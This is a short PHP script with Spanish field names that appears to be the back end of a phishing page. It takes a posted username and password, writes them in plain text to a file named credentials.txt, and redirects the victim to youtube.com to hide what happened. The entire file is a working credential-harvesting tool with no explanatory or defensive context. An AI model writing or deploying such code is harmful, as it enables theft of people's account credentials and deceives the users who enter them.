<?php

if(isset($_POST["usuario"])){
        $user = $_POST["usuario"];
        $contra = $_POST["contrasena"];
        $file = fopen("credentials.txt", "w+");
        fwrite($file, "Usuario: $user
Contrasena: $contra
");
        header('location: http://youtube.com');
}
?>
